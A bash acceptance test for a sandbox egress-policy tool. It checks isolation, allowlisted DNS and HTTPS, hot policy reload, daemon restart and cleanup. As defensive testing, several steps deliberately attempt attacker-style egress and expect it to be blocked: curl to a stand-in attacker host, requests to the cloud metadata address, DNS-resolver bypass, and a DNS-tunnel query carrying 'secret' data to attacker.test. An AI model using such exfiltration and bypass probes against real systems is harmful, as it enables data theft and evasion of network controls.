#!/usr/bin/env bash
# M1 acceptance: exec-mode sandbox with egress policy.
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"
trap finish EXIT

P="$E2E_DIR/policies"
orig_fwd=$(sysctl -n net.ipv4.ip_forward)
orig_acct=$(sysctl -n net.netfilter.nf_conntrack_acct)

log "setup"
sandwall nuke >/dev/null
setup_attacker || exit 1
expect_ok "attacker endpoint reachable from host" curl -sf -m 3 "http://$ATTACKER_IP:$ATTACKER_PORT/"
start_daemon || exit 1
expect_ok "create sandbox t1" sandwall sandbox create t1 --policy "$P/m1.yaml"
expect_ok "create sandbox t2" sandwall sandbox create t2 --policy "$P/m1.yaml"
expect_fail "duplicate id rejected" sandwall sandbox create t1 --policy "$P/m1.yaml"
expect_fail "invalid policy rejected" sandwall sandbox create bad --policy "$P/invalid.yaml"
expect_eq "invalid create left nothing behind" "$(ip netns list | grep -cE '^sb[0-9]+')" 2

log "sandbox isolation"
expect_eq "exec runs as nobody" "$(sbx t1 id -u)" 65534
expect_eq "no effective capabilities" "$(sbx t1 awk '/^CapEff/ {print $2}' /proc/self/status)" 0000000000000000
expect_fail "cannot change network config" sbx t1 ip link set lo down
expect_eq "IPv6 disabled in netns" "$(sbx t1 cat /proc/sys/net/ipv6/conf/all/disable_ipv6)" 1
expect_eq "resolver is the sandbox proxy" "$(sbx t1 awk '/^nameserver/ {print $2}' /etc/resolv.conf)" 10.200.1.1

log "allowlisted egress"
expect_eq "curl https://pypi.org succeeds" "$(sbx t1 curl -sS -m 20 -o /dev/null -w '%{http_code}' https://pypi.org/)" 200
wait_log t1 "DNS allow logged with answers" '.type=="dns" and .qname=="pypi.org." and .verdict=="allow" and (.answers|length>0)'
expect_eq "AAAA answered empty" "$(sbx t1 dig +short +tries=1 +time=3 AAAA pypi.org | wc -l)" 0

log "non-allowlisted domain"
expect_eq "dig example.com is REFUSED" "$(dns_status t1 example.com)" REFUSED
expect_fail "curl https://example.com fails" sbx t1 curl -sS -m 5 https://example.com/
wait_log t1 "DNS refusal logged" '.type=="dns" and .qname=="example.com." and .verdict=="refused"'

log "blocked ranges and host access"
expect_fail "metadata 169.254.169.254 blocked" sbx t1 curl -sS -m 3 http://169.254.169.254/
wait_log t1 "metadata deny logged" '.type=="deny" and .dst_ip=="169.254.169.254" and .reason=="blocked_range"'
expect_fail "host LAN IP $HOST_IP blocked" sbx t1 curl -sS -m 3 "http://$HOST_IP/"
wait_log t1 "host access deny logged" ".type==\"deny\" and .dst_ip==\"$HOST_IP\" and .reason==\"host_access\""
# A gateway on a private address is a blocked range; one on a public
# address is just another destination outside the allowlist.
if nft get element inet sandwall blocked_ranges "{ $GATEWAY_IP }" >/dev/null 2>&1; then gw_reason=blocked_range; else gw_reason=not_allowed; fi
expect_fail "LAN gateway $GATEWAY_IP blocked" sbx t1 curl -sS -m 3 "http://$GATEWAY_IP/"
wait_log t1 "LAN gateway deny logged ($gw_reason)" ".type==\"deny\" and .dst_ip==\"$GATEWAY_IP\" and .reason==\"$gw_reason\""
expect_fail "other sandbox 10.200.2.2 blocked" sbx t1 curl -sS -m 3 http://10.200.2.2/
wait_log t1 "cross-sandbox deny logged" '.type=="deny" and .dst_ip=="10.200.2.2" and .reason=="blocked_range"'
expect_eq "t2 refuses example.com on its own proxy" "$(dns_status t2 example.com)" REFUSED
wait_log t2 "t2 refusal logged in t2's own log" '.type=="dns" and .qname=="example.com." and .sandbox_id=="t2"'
expect_fail "other sandbox's DNS proxy blocked" sbx t1 dig +tries=1 +time=2 @10.200.2.1 pypi.org
wait_log t1 "cross-sandbox DNS deny logged" '.type=="deny" and .dst_ip=="10.200.2.1" and .reason=="host_access"'

log "unlisted attacker endpoint"
expect_fail "attacker $ATTACKER_IP blocked" sbx t1 curl -sS -m 3 "http://$ATTACKER_IP:$ATTACKER_PORT/"
wait_log t1 "attacker deny logged" ".type==\"deny\" and .dst_ip==\"$ATTACKER_IP\" and .dst_port==$ATTACKER_PORT and .reason==\"not_allowed\""

log "DNS bypass"
expect_fail "dig @8.8.8.8 blocked" sbx t1 dig +tries=1 +time=2 @8.8.8.8 example.com
wait_log t1 "UDP bypass logged" '.type=="deny" and .dst_ip=="8.8.8.8" and .dst_port==53 and .reason=="dns_bypass"'
expect_fail "dig +tcp @1.1.1.1 blocked" sbx t1 dig +tcp +tries=1 +time=2 @1.1.1.1 example.com
wait_log t1 "TCP bypass logged" '.type=="deny" and .dst_ip=="1.1.1.1" and .proto=="tcp" and .reason=="dns_bypass"'
expect_fail "DoT to 1.1.1.1:853 blocked" sbx t1 curl -sS -m 3 telnet://1.1.1.1:853
wait_log t1 "DoT bypass logged" '.type=="deny" and .dst_port==853 and .reason=="dns_bypass"'

log "DNS tunnel attempt never reaches upstream"
tcpdump -i "$UPLINK" -n -l -s 0 -A 'port 53' >"$T/uplink-dns.txt" 2>/dev/null &
TCPDUMP=$!
sleep 1
secret=$(head -c20 /dev/urandom | xxd -p)
canary=$(head -c8 /dev/urandom | xxd -p)
expect_eq "tunnel query REFUSED" "$(dns_status t1 "$secret.attacker.test")" REFUSED
# Positive control: an allowlisted name must show up on the uplink, proving
# the capture would have caught a forwarded query.
sbx t1 dig +tries=1 +time=3 "$canary.files.pythonhosted.org" >/dev/null 2>&1
sleep 1
kill "$TCPDUMP"; wait "$TCPDUMP" 2>/dev/null
expect_ok "capture saw the allowlisted canary query" grep -q "$canary" "$T/uplink-dns.txt"
expect_fail "capture never saw the tunnel query" grep -q "$secret" "$T/uplink-dns.txt"
wait_log t1 "tunnel refusal logged" ".type==\"dns\" and .qname==\"$secret.attacker.test.\" and .verdict==\"refused\""

log "hot reload"
# A slow download that is in flight across a reload removing pypi.org must survive.
sbx t1 curl -sS -m 8 --limit-rate 200k -o /dev/null -w '%{size_download}' https://pypi.org/simple/ >"$T/inflight.txt" 2>"$T/inflight.err" &
INFLIGHT=$!
sleep 3
expect_ok "apply policy without pypi.org" sandwall policy apply t1 "$P/m1-reload.yaml"
expect_eq "new pypi.org lookups now refused" "$(dns_status t1 pypi.org)" REFUSED
wait "$INFLIGHT"
inflight_rc=$?
expect_eq "in-flight download ran to its own timeout (curl exit 28)" "$inflight_rc" 28
inflight_bytes=$(<"$T/inflight.txt")
if ((${inflight_bytes:-0} > 1000000)); then pass "in-flight download kept receiving after reload ($inflight_bytes bytes)"; else fail "in-flight download stalled at ${inflight_bytes:-0} bytes"; fi
expect_eq "curl https://example.com now succeeds" "$(sbx t1 curl -sS -m 20 -o /dev/null -w '%{http_code}' https://example.com/)" 200
expect_eq "other sandbox unaffected by reload" "$(sandwall sandbox list --json | jq -r '.[] | select(.id=="t2") | .policy.egress.allow_domains | index("example.com")')" null

log "daemon restart restores sandboxes"
stop_daemon
expect_eq "DNS fails closed while daemon is down" "$(ip netns exec sb1 dig +tries=1 +time=2 pypi.org | awk '/status:/ {print $6}')" ""
start_daemon || exit 1
expect_eq "sandboxes restored" "$(sandwall sandbox list --json | jq -r '[.[].id] | join(",")')" "t1,t2"
expect_eq "restored sandbox keeps reloaded policy" "$(sbx t1 curl -sS -m 20 -o /dev/null -w '%{http_code}' https://example.com/)" 200

log "destroy and nuke"
expect_ok "destroy t2" sandwall sandbox destroy t2
expect_eq "t2 netns gone" "$(ip netns list | grep -c '^sb2')" 0
expect_ok "t2 log kept after destroy" test -s "$LOGS/t2.jsonl"
expect_ok "nuke with daemon running" sandwall nuke
assert_no_remnants
expect_eq "ip_forward restored" "$(sysctl -n net.ipv4.ip_forward)" "$orig_fwd"
expect_eq "nf_conntrack_acct restored" "$(sysctl -n net.netfilter.nf_conntrack_acct)" "$orig_acct"
expect_eq "daemon forgot sandboxes" "$(sandwall sandbox list --json | jq length)" 0
expect_ok "daemon recovers after nuke" sandwall sandbox create t3 --policy "$P/m1.yaml"
expect_eq "new sandbox works after nuke" "$(sbx t3 curl -sS -m 20 -o /dev/null -w '%{http_code}' https://pypi.org/)" 200
stop_daemon
expect_ok "nuke with daemon stopped" sandwall nuke
expect_ok "nuke is idempotent" sandwall nuke
assert_no_remnants
